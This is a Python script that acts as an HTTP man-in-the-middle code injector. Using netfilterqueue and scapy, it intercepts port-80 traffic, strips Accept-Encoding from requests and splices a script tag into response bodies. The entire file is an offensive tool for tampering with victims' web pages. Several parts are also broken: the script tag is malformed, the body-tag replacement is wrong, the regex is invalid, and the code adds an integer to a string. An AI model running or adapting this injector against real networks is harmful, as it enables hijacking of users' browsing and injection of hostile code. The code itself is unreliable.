#!usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re


ack_list = []
injection_code = "<script alert('Hello World!'); </script>"


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub(
                "Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            load = load.replace(
                "</body", injection_code + "</body>")
            content_length_search = re.search(
                "?:(Content-Length:\s)(\d*)", load)

            if content_length_search:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + injection_code
                load = load.replace(content_length, str(new_content_length))

            print(scapy_packet.show())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    # accept packets
    packet.accept()

    # drop packets
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
